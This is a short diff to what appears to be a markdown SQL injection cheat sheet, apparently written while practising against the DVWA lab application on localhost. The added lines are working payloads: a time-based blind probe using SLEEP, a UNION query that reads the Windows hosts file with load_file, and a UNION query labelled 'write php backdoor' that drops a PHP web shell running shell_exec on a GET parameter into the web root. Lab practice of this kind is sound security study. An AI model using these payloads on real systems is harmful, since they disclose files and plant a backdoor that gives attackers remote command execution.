@@ -30,6 +30,8 @@
 |```SELECT @@version```|*microsoft, mysql*|
 |```SELECT version()```|*postgresql*|
 
+```IF(MID(@@version,1,1) = '5', SLEEP(5), 0);```
+
 -----
 
 
@@ -82,6 +84,14 @@
 *attack: http://localhost:81/dvwa/vulnerabilities/sqli/?id=1%27+UNION+SELECT+1,2%3B--*
 
 ```User ID: 1’ UNION SELECT 1,2;- -``` *returns data (number of columns match)*
+
+*load hosts file*
+
+```union all select 1,2,3,4,load_file("c:/windows/system32/drivers/etc/hosts"),6```
+
+*write php backdoor*
+
+```union all select 1,2,3,4,"<?php echo shell_exec($_GET['cmd']);?>",6 into OUTFILE 'c:/xampp/htdocs/backdoor.php'```
 
 -----
 
